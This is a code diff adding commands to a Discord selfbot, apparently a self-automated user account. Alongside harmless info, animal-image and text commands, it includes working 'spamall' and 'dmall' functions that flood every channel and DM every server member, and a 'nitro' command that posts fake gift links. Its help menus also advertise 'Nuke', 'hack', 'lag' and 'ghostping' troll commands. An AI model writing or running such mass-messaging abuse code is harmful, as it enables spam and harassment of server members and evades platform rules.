+      if (message.guild.verificationLevel === "MEDIUM")
+        message.guild.verificationLevel = "Medium";
+      if (message.guild.verificationLevel === "HIGH")
+        message.guild.verificationLevel = "High";
+      if (message.guild.verificationLevel === "VERY_HIGH")
+        message.guild.verificationLevel = "`Highest";
+      //Others
+      const role = message.guild.roles
+        .first(20)
+        .map((r) => r)
+        .join(", ");
+      const role2 = message.guild.roles.map((r) => r).join(", ");
+      const RoleAmount = message.guild.roles.size - 20;
+      //Something else
+      const dnd = message.guild.members.filter(
+        (user) => user.presence.status == "dnd"
+      ).size;
+      const idle = message.guild.members.filter(
+        (user) => user.presence.status == "idle"
+      ).size;
+      const online = message.guild.members.filter(
+        (user) => user.presence.status == "online"
+      ).size;
+      const offline = message.guild.members.filter(
+        (user) => user.presence.status == "offline"
+      ).size;
+      const streaming = message.guild.members.filter(
+        (user) => user.presence.status == "streaming"
+      ).size;
+      const txt = message.guild.channels.filter(
+        (channel) => channel.type == "text"
+      ).size;
+      const voice = message.guild.channels.filter(
+        (channel) => channel.type == "voice"
+      ).size;
+      const category = message.guild.channels.filter(
+        (channel) => channel.type == "category"
+      ).size;
+      const bots = message.guild.members.filter((m) => m.user.bot).size;
+      const Members =
+        message.guild.members.filter((m) => m.user).size -
+        message.guild.members.filter((m) => m.user.bot).size;
+      //Create the embed
+      if (enabled === true) {
+        let Embed = new Discord.RichEmbed()
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setTitle(`${message.guild.name} info`)
+          .setThumbnail(message.guild.iconURL)
+          .addField("Guild Name", message.guild.name, true)
+          .addField("Guild Name Acronym", message.guild.nameAcronym, true)
+          .addField("Guild Owner", `<@!${message.guild.ownerID}>`, true)
+          .addField(
+            "Members",
+            `
+        Total: ${message.guild.members.size.toLocaleString()}
+        Humans: ${Members.toLocaleString()}
+        Bots: ${bots.toLocaleString()}
+        `,
+            true
+          )
+          .addField(
+            "Member Presence",
+            `
+        Do Not Disturb: ${dnd.toLocaleString()}
+        Idle: ${idle.toLocaleString()}
+        Online: ${online.toLocaleString()}
+        Offline: ${offline.toLocaleString()}
+        Streaming: ${streaming.toLocaleString()}
+        `,
+            true
+          )
+          .addField("Guild Region", message.guild.region, true)
+          .addField(
+            "Guild created at",
+            moment(message.guild.createdAt).format("MMMM Do YYYY, h:mm A") +
+              " | " +
+              moment(message.guild.createdAt).startOf().fromNow(),
+            true
+          )
+          .addField("Guild ID", message.guild.id, true)
+          .addField(
+            "Total Boosts",
+            message.guild.premiumSubscriptionCount,
+            true
+          )
+          .addField("Boost Level", message.guild.premiumTier, true)
+          .addField("Total Emojis", message.guild.emojis.size, true)
+          .addField(
+            "Channels",
+            `
+        Total: ${message.guild.channels.size.toLocaleString()}
+        Text: ${txt.toLocaleString()}
+        Voice: ${voice.toLocaleString()}
+        Categories: ${category.toLocaleString()}
+        `,
+            true
+          )
+          .addField(
+            "Verification Level",
+            message.guild.verificationLevel,
+            true
+          );
+        if (message.guild.roles.size < 20) {
+          Embed.addField(
+            `[${message.guild.roles.size.toLocaleString()}] Total Roles`,
+            role2
+          );
+        } else {
+          Embed.addField(
+            `[${message.guild.roles.size.toLocaleString()}] Total Roles`,
+            role + `... and ${RoleAmount} more!`
+          );
+        }
+        Embed.setTimestamp();
+        message.channel.send(Embed);
+      } else {
+        message.channel.send(`\`\`\`Guild Name: ${message.guild.name}
+Guild Name Acronym: ${message.guild.nameAcronym}
+Guild Owner: ${message.guild.owner.user.tag}
+Members:
+    Total: ${message.guild.members.size.toLocaleString()}
+    Humans: ${Members.toLocaleString()}
+    Bots: ${bots.toLocaleString()}
+Member Presence:
+    Do Not Disturb: ${dnd.toLocaleString()}
+    Idle: ${idle.toLocaleString()}
+    Online: ${online.toLocaleString()}
+    Offline: ${offline.toLocaleString()}
+    Streaming: ${streaming.toLocaleString()}
+Guild Region: ${message.guild.region}
+Guild created at: ${moment(message.guild.createdAt).format(
+          "MMMM Do YYYY, h:mm A"
+        )} | ${moment(message.guild.createdAt).startOf().fromNow()}
+Guild ID: ${message.guild.id}
+Total Boosts: ${message.guild.premiumSubscriptionCount}
+Boost Level: ${message.guild.premiumTier}
+Total Emojis: ${message.guild.emojis.size}
+Channels:
+    Total ${message.guild.channels.size.toLocaleString()}
+    Text: ${txt.toLocaleString()}
+    Voice: ${voice.toLocaleString}
+    Categories: ${category.toLocaleString()}
+Verification Level: ${message.guild.verificationLevel}
+Total Roles: ${message.guild.roles.size.toLocaleString()}${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }\`\`\``);
+      }
+    }
+
+    if (cmd === "empty") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      message.channel.send("​");
+    }
+
+    if (cmd === "join") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const serverInvite = args[0];
+      if (!serverInvite)
+        return message.channel.send(
+          "Please specify a server invite code without the <https://discord.gg/> part or <https://discord.com/invites/>"
+        );
+      bot.user
+        .acceptInvite(serverInvite)
+        .catch((err) =>
+          console.log(
+            `${colors.red("[ERROR]:")} ${colors.yellow(
+              "Invalid server invite"
+            )}`
+          )
+        );
+    }
+
+    if (cmd === "nitro") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      function nitroCode() {
+        let code = "";
+        let dict =
+          "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        for (var i = 0; i < 19; i++) {
+          code = code + dict.charAt(Math.floor(Math.random() * dict.length));
+        }
+        return code;
+      }
+      message.channel.send(`https://discord.gift/${nitroCode()}`);
+    }
+
+    if (cmd === "dog") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const { body } = await superagent.get(
+        `https://some-random-api.ml/img/dog`
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Random dog image")
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setImage(body.link);
+        message.channel.send(embed);
+      } else {
+        let img = new Discord.Attachment(body.link, "dog.png");
+        message.channel.send(img);
+      }
+    }
+
+    if (cmd === "cat") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const { body } = await superagent.get(
+        `https://some-random-api.ml/img/cat`
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Random cat image")
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setImage(body.link);
+        message.channel.send(embed);
+      } else {
+        let img = new Discord.Attachment(body.link, "cat.png");
+        message.channel.send(img);
+      }
+    }
+
+    if (cmd === "fox") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const { body } = await superagent.get(
+        `https://some-random-api.ml/img/fox`
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Random fox image")
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setImage(body.link);
+        message.channel.send(embed);
+      } else {
+        let img = new Discord.Attachment(body.link, "fox.png");
+        message.channel.send(img);
+      }
+    }
+
+    if (cmd === "foxfact") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const { body } = await superagent.get(
+        `https://some-random-api.ml/facts/fox`
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      message.channel.send(body.fact);
+    }
+
+    if (cmd === "dogfact") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const { body } = await superagent.get(
+        `https://some-random-api.ml/facts/dog`
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      message.channel.send(body.fact);
+    }
+
+    if (cmd === "catfact") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const { body } = await superagent.get(
+        `https://some-random-api.ml/facts/cat`
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      message.channel.send(body.fact);
+    }
+
+    if (cmd === "wink") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const user = message.mentions.users.first();
+      if (!user) return message.channel.send("Please mention a user.");
+      const { body } = await superagent.get(
+        `https://some-random-api.ml/animu/wink`
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setDescription(`${message.author} winks at ${user}`)
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setImage(body.link);
+        message.channel.send(embed);
+      } else {
+        let img = new Discord.Attachment(body.link, "wink.png");
+        message.channel.send(
+          `${message.author.username} winks at ${user.username}`,
+          img
+        );
+      }
+    }
+
+    if (cmd === "pat") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const user = message.mentions.users.first();
+      if (!user) return message.channel.send("Please mention a user.");
+      const { body } = await superagent.get(
+        `https://some-random-api.ml/animu/pat`
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setDescription(`${message.author} pats ${user}`)
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setImage(body.link);
+        message.channel.send(embed);
+      } else {
+        let img = new Discord.Attachment(body.link, "pat.png");
+        message.channel.send(
+          `${message.author.username} pats ${user.username}`,
+          img
+        );
+      }
+    }
+
+    if (cmd === "hug") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const user = message.mentions.users.first();
+      if (!user) return message.channel.send("Please mention a user.");
+      const { body } = await superagent.get(
+        `https://some-random-api.ml/animu/hug`
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setDescription(`${message.author}  hugs ${user}`)
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setImage(body.link);
+        message.channel.send(embed);
+      } else {
+        let img = new Discord.Attachment(body.link, "hug.png");
+        message.channel.send(
+          `${message.author.username} hugs ${user.username}`,
+          img
+        );
+      }
+    }
+
+    if (cmd === "randomtoken") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const { body } = await superagent.get(
+        "https://some-random-api.ml/bottoken"
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      message.channel.send(body.token);
+    }
+
+    if (cmd === "meme") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const { body } = await superagent.get("https://some-random-api.ml/meme");
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle(body.caption)
+          .setImage(body.image)
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤");
+        message.channel.send(embed);
+      } else {
+        let img = new Discord.Attachment(body.image, "meme.png");
+        message.channel.send(body.caption, img);
+      }
+    }
+
+    if (cmd === "base64") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args[0])
+        return message.channel.send(
+          "Uknown parameter. Please choose the method first, either decode or encode it"
+        );
+
+      const method = ["encode", "decode"];
+      if (!method.includes(args[0].toLowerCase()))
+        return message.channel.send(
+          "Uknown parameter. Please choose the method first, either decode or encode it"
+        );
+
+      let msg = args.slice(1).join(" ");
+
+      if (!msg) return message.channel.send("Please provide some text");
+
+      if (msg.length > 1024)
+        return message.channel.send(
+          "Your text is to long. The maximum amount of characters is `1,024`"
+        );
+
+      if (args[0].toLowerCase() === method[0]) {
+        const { body } = await superagent.get(
+          `https://some-random-api.ml/base64?encode=${msg}`
+        );
+        return message.channel.send(body.base64);
+      } else if (args[0].toLowerCase() === method[1]) {
+        const { body } = await superagent.get(
+          `https://some-random-api.ml/base64?decode=${msg}`
+        );
+        return message.channel.send(body.text);
+      }
+    }
+
+    if (cmd === "spamall") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args.join(" "))
+        return message.channel.send("Please provide a message.");
+      message.guild.channels
+        .filter((ch) => ch.type === "text")
+        .forEach((ch) => {
+          console.log(colors.green(`[+] Message sent to #${ch.name}`));
+          ch.send(args.join(" ")).catch((err) => {
+            return console.log(
+              colors.red(`[-] Message couldn't send to #${ch.name}`)
+            );
+          });
+        });
+    }
+
+    if (cmd === "dmall") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args.join(" "))
+        return message.channel.send("Please provide a message.");
+      message.guild.members.forEach((member) => {
+        try {
+          member.send(args.join(" ")).catch((err) => {
+            return console.log(
+              colors.red(`[-] Couldn't send message to ${member.user.tag}`)
+            );
+          });
+          console.log(colors.green(`[+] Message sent to ${member.user.tag}`));
+        } catch (err) {
+          return console.log(
+            colors.red(`[-] Couldn't send message to ${member.user.tag}`)
+          );
+        }
+      });
+    }
+
+    if (cmd === "cembed") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args.join(" "))
+        return message.channel.send("Please specify some text!");
+      const options = message.content.slice(7).split(" | ");
+      let embed = new Discord.RichEmbed();
+      if (options[0]) embed.setTitle(options[0]);
+      if (options[1]) embed.setDescription(options[1]);
+      if (options[2]) embed.setColor(`0x${options[2]}`);
+      if (options[3]) embed.setFooter(options[3]);
+      if (options[5]) embed.setAuthor(options[5]);
+      if (options[6]) embed.setThumbnail(options[6]);
+      message.channel.send(embed);
+    }
+
+    if (cmd === "fun") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        const description = stripIndents`<> = required | [] = optional
+
+            **${prefix}8ball <question>** » Asks the 8ball a question of your choice
+            **${prefix}avatar [user]** » Gets the avatar from the mentioned user
+            **${prefix}cb <message>** » Talk to yourself as if it's a chat bot
+            **${prefix}hug <user>** » Random anime hugging gif
+            **${prefix}meme** » Sends a fresh meme of the internet
+            **${prefix}ping** » Shows the message and the websocket latency
+            **${prefix}pat <user>** » Random anime patting gif
+            **${prefix}randomtoken** » Generates a random invalid discord bot token
+            **${prefix}uptime** » Shows how long the bot has been currently been running for
+            **${prefix}wink <user>** » Random anime winking gif`;
+        let embed = new Discord.RichEmbed()
+          .setTitle("Fun Commands")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤");
+        if (description.length < 2000) {
+          embed.setDescription(description);
+        } else {
+          const { body } = await post("https://hastebin.com/documents").send(
+            description
+          );
+          embed.setDescription(
+            `The list was to big, click this link to view all commands:\n**https://hastebin.com/${body.key}**`
+          );
+        }
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            Fun Commands
+
+            <> = required | [] = optional
+
+            ${prefix}8ball <question> » Asks the 8ball a question of your choice
+            ${prefix}avatar [user] » Gets the avatar from the mentioned user
+            ${prefix}cb <message> » Talk to yourself as if it's a chat bot
+            ${prefix}hug <user> » Random anime hugging gif
+            ${prefix}meme » Sends a fresh meme of the internet
+            ${prefix}ping » Shows the message and the websocket latency
+            ${prefix}pat <user> » Random anime patting gif
+            ${prefix}randomtoken » Generates a random invalid discord bot token
+            ${prefix}uptime » Shows how long the bot has been currently been running for
+            ${prefix}wink <user> » Random anime winking gif${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "text") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Text Commands")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+            <> = required | [] = optional
+
+            **${prefix}1337 <text>** » Speak 1337
+            **${prefix}ascii <text>** » Converts your message to ascii
+            **${prefix}binary <encode|decode> <message|binary>** » Encodes/decodes binary
+            **${prefix}base64 <encode|decode> <message|base64>** » Encodes/decodes base64
+            **${prefix}cembed <options>** » Talk to yourself as if it's a chat bot
+            **${prefix}embed <message>** » Sends an embed with your text
+            **${prefix}empty** » Sends an empty message
+            **${prefix}emojify <text>** » Converts your text to emojis
+            **${prefix}reverse <message>** » Reverses your message
+            **${prefix}say <message>** » Says what ever you want
+            **${prefix}spolier <message>** » Converts your text to a spoiler
+            **${prefix}msg <bold|italics|underline|destroy|upper|lower|strikethrough|hidden|everything> <message>** » Sends your message in different forms
+            `);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            <> = required | [] = optional
+
+            ${prefix}1337 <text> » Speak 1337
+            ${prefix}ascii <text> » Converts your message to ascii
+            ${prefix}binary <encode|decode> <message|binary> » Encodes/decodes binary
+            ${prefix}base64 <encode|decode> <message|base64> » Encodes/decodes base64
+            ${prefix}cembed <options> » Talk to yourself as if it's a chat bot
+            ${prefix}embed <message> » Sends an embed with your text
+            ${prefix}empty » Sends an empty message
+            ${prefix}emojify <text> » Converts your text to emojis
+            ${prefix}reverse <message> » Reverses your message
+            ${prefix}say <message> » Says what ever you want
+            ${prefix}spolier <message> » Converts your text to a spoiler
+            ${prefix}msg <bold|italics|underline|destroy|upper|lower|strikethrough|hidden|everything> <message> » Sends your message in different forms${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "1337") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const text = args.join(" ");
+      if (!text)
+        return message.channel.send(
+          "Please specify some text to speak in 1337"
+        );
+      const newtext = text
+        .replace("a", "4")
+        .replace("A", "4")
+        .replace("e", "3")
+        .replace("E", "3")
+        .replace("i", "!")
+        .replace("I", "!")
+        .replace("o", "0")
+        .replace("O", "0")
+        .replace("u", "|_|")
+        .replace("U", "|_|");
+      message.channel.send(newtext);
+    }
+
+    if (cmd === "utility") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Utility Commands")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+            <> = required | [] = optional
+
+            **${prefix}afk <on - off>** » Enabels or Disables afk mode
+            **${prefix}clean <amount>** » Deletes the specified amount of your messages
+            **${prefix}codeblock <type> <code>** » Converts your text to a code block
+            **${prefix}eval <code>** » Evaluates JavaScript code
+            **${prefix}hastebin <message>** » Sends your message to a hastebin
+            **${prefix}massreact <emoji>** » Adds a reaction to all cached messages in the channel
+            **${prefix}snipe [page-num]** » Snipes the recently deleted message
+            `);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            <> = required | [] = optional
+
+            ${prefix}afk <on - off> » Enabels or Disables afk mode
+            ${prefix}clean <amount> » Deletes the specified amount of your messages
+            ${prefix}codeblock <type> <code> » Converts your text to a code block
+            ${prefix}eval <code> » Evaluates JavaScript code
+            ${prefix}massreact <message> » Sends your message to a haste bin
+            ${prefix}snipe [page-num] » Snipes the recently deleted message${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "help") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Available Commands")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+            <> = required | [] = optional
+
+            **${prefix}animals** » Animals Commands
+            **${prefix}account** » Account Commands
+            **${prefix}abuse** » Nuke Commands
+            **${prefix}fun** » Fun Commands
+            **${prefix}info** » Info Commands
+            **${prefix}moderation** » Moderation Commands
+            **${prefix}status** » Status Commands
+            **${prefix}troll** » Troll Commands
+            **${prefix}text** » Text Commands
+            **${prefix}face** » Face Commands
+            **${prefix}utility** » Utility Commands
+            `);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            <> = required | [] = optional
+
+            ${prefix}animals » Animals Commands
+            ${prefix}account » Account Commands
+            ${prefix}abusive » Nuke Commands
+            ${prefix}fun » Fun Commands
+            ${prefix}info » Info Commands
+            ${prefix}moderation » Moderation Commands
+            ${prefix}status » Status Commands
+            ${prefix}troll » Troll Commands
+            ${prefix}face » Face Commands
+            ${prefix}utility » Utility Commands${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "troll") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Troll Commands")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+          <> = required | [] = optional
+
+          **${prefix}ghostping <channel-id> <user-id>** » Ghostpings the user in the channel [GUILD ONLY]
+          **${prefix}hack <user-id>** » Hacks the user
+          **${prefix}lag <user-id> <amount>** » Sends the user the specified amount of lag messages
+          **${prefix}nitro** » Generates a random discord nitro code
+          **${prefix}fakenitro <user-id>** » Sends the user a discor nitro rick roll
+          `);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+          Troll Commands
+
+          <> = required | [] = optional
+
+          ${prefix}ghostping <channel-id> <user-id> » Ghostpings the user in the channel [GUILD ONLY]
+          ${prefix}hack <user-id> » Hacks the user
+          ${prefix}nitro » Generates a random discord nitro code
+          ${prefix}fakenitro <user-id> » Sends the user a discor nitro rick roll${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+          \`\`\``);
+      }
+    }
+
+    if (cmd === "info") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Info Commands")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+            <> = required | [] = optional
+
+            **${prefix}botinfo** » Shows information on the Cryptic selfbot
+            **${prefix}catfact** » Random cat fact
+            **${prefix}dogfact** » Random dog fact
+            **${prefix}foxfact** » Random fox fact
+            **${prefix}help** » Shows a list of command categories
+            **${prefix}serverinfo** » Shows the servers information [GUILD ONLY]
+            **${prefix}tokeninfo <token>** » Gets information on that token
+            **${prefix}whois [user]** » Shows information on the mentioned user [GUILD ONLY]
+            `);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            Info Commands
+
+            <> = required | [] = optional
+
+            ${prefix}botinfo » Shows information on the Cryptic selfbot
+            ${prefix}catfact » Random cat fact
+            ${prefix}dogfact » Random dog fact
+            ${prefix}foxfact » Random fox fact
+            ${prefix}help » Shows a list of command categories
+            ${prefix}serverinfo » Shows the servers information [GUILD ONLY]
+            ${prefix}tokeninfo <token> » Gets information on that token
+            ${prefix}whois [user] » Shows information on the mentioned user [GUILD ONLY]${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "face") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Face Commands")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+            <> = required | [] = optional
+
+            **${prefix}lenny** » Sends ( ͡° ͜ʖ ͡°) into the current channel
+            **${prefix}flip** » Sends (╯°□°）╯︵ ┻━┻ into the current channel
+            **${prefix}unflip** » Sends ┬─┬ ノ( ゜-゜ノ) into the current channel
+            **${prefix}shrug** » Sends ¯\\_(ツ)_/¯ into the current channel
+            `);
+        message.channel.send(embed);
+      } else {
